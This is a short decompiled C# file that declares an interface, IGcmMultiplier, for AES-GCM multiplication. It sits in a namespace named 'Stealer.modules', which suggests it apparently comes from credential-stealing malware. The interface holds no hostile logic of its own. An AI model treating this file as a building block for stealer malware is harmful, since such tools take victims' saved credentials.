using System;

namespace Stealer.modules
{
	// Token: 0x0200000C RID: 12
	public interface IGcmMultiplier
	{
		// Token: 0x06000039 RID: 57
		void Init(byte[] H);

		// Token: 0x0600003A RID: 58
		void MultiplyH(byte[] x);
	}
}
